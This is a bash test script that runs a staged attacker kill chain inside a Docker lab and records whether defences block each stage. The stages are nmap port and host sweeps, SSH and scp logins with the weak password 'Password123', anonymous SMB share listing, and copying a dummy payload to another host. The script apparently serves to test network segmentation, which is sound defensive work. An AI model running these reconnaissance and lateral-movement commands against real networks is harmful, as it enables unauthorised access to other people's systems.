#!/bin/bash
cd "$(dirname "$0")/.." || exit 1
# Attacker kill-chain run FROM THE WORKSTATION (container ps2-ws) against the lab only.
# usage: tests/attack.sh <phase>   (CIDRS env = subnets to sweep)
# Output lines:  <stage>|SUCCESS|BLOCKED|<detail>   SUCCESS = attacker wins, BLOCKED = defense works
PHASE=${1:-flat}
CIDRS=${CIDRS:-10.10.0.0/26}
mkdir -p results; OUT=results/${PHASE}_attack.txt; : > "$OUT"
emit() { echo "$*" | tee -a "$OUT"; }
ws() { docker exec ps2-ws "$@"; }
SSHO="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 -o PreferredAuthentications=password"

# A1: port scan of the lab hosts (T1046)
webip=$(ws getent hosts web | awk '{print $1}')
open=$(ws nmap -Pn -n -p 22,80,443,445,5432,8080 --max-retries 1 --max-rtt-timeout 500ms --host-timeout 10s -T4 -oG - web app db files jump 2>/dev/null \
  | grep 'Ports:' | awk -F'\t' '{split($1,h," "); ip=h[2]; n=split($2,p,", "); for(i=1;i<=n;i++){ sub(/^Ports: /,"",p[i]); if (p[i] ~ /\/open\//){split(p[i],q,"/"); print ip":"q[1]}}}')
beyond=$(echo "$open" | grep -v "^${webip}:443$" | grep -c .)
if [ "$beyond" -gt 0 ]; then emit "A1|SUCCESS|scan exposed $beyond services beyond the web portal: $(echo "$open" | tr '\n' ' ')"
else emit "A1|BLOCKED|scan found only the published web portal (443)"; fi

# A5: remote system discovery sweep (T1018)
self=$(ws hostname -i | awk '{print $1}')
up=$(ws nmap -sn -n --max-retries 0 --max-rtt-timeout 400ms --host-timeout 4s -T4 -PE -PS22,80,443,445,5432,8080 $CIDRS -oG - 2>/dev/null \
  | awk '/Status: Up/{print $2}' | grep -v "^${self}$" | grep -vE '\.(1|254)$' | grep -v "^${webip}$" | grep -c .)  # ignore own IP, network gateways (.1/.254) and the published web portal
if [ "$up" -gt 0 ]; then emit "A5|SUCCESS|sweep discovered $up other hosts"
else emit "A5|BLOCKED|sweep discovered no other hosts"; fi

# A2: SSH login to the database host with a weak password (T1021.004)
out=$(ws sshpass -p Password123 ssh $SSHO dbadmin@db 'echo PWNED-$(hostname)' 2>&1)
if echo "$out" | grep -q PWNED; then emit "A2|SUCCESS|logged in to db as dbadmin"
else emit "A2|BLOCKED|no SSH session to db"; fi

# A3: SMB share access on the file server (T1021.002)
out=$(ws timeout 10 smbclient -N //files/public -c ls 2>&1)
if echo "$out" | grep -q secret.txt; then emit "A3|SUCCESS|listed //files/public (secret.txt visible)"
else emit "A3|BLOCKED|no SMB access to files"; fi

# A4: lateral tool transfer, copy a payload to another host (T1570)
ws sh -c 'echo malicious-payload > /tmp/payload'
docker exec ps2-files rm -f /tmp/payload 2>/dev/null
ws sshpass -p Password123 scp $SSHO /tmp/payload svc@files:/tmp/payload >/dev/null 2>&1
if docker exec ps2-files test -f /tmp/payload 2>/dev/null; then emit "A4|SUCCESS|payload copied to files:/tmp/payload"
else emit "A4|BLOCKED|payload could not be copied"; fi
